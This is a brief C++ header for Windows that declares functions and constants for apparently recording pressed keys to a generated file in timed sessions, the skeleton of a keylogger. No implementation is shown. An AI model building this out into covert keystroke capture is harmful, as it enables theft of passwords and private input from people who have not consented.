#pragma once

#include <cstdio>
#include <windows.h>

#include "Keys.h"

//====================================================================================================

void generateFilePath(char* path);
bool beginSession(const char* path);
bool isSessionContinue();
bool wasStatusKeysUpdate();
void rememberPressedKeys();
void endSession();

//====================================================================================================

const int KEYS_NUMBER     = 255;
const int MAX_BUFFER_SIZE = 10;
const int MAX_STRING_SIZE = 128;
const int MAX_KEY_SIZE    = 32;
const int MAX_TEMP_SIZE   = 16;
const int SLEEP_TIME      = 30;
